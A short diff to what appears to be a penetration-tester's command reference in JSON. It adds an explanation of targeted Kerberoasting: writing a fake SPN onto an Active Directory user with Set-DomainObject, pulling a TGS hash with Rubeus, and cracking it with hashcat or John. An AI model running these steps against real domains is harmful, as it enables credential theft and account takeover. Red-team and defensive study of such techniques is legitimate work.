@@ -122,5 +122,6 @@
       "label": "Crack the targeted hash (John)",
       "command": "john.exe --wordlist=<wordlist> <hashfile>"
     }
-  ]
+  ],
+  "explain": "Makes an SPN-less user Kerberoastable by writing a fake SPN you can then roast:\n  Set-DomainObject -Identity <user>   the user you have GenericWrite/GenericAll over\n  -Set @{serviceprincipalname='nonexistent/BLAH'}   plant an arbitrary SPN\nWith an SPN present, Rubeus kerberoast /user:<user> returns a TGS hash; crack it (hashcat -m 13100), then clear the SPN (-Clear serviceprincipalname) to clean up."
 }
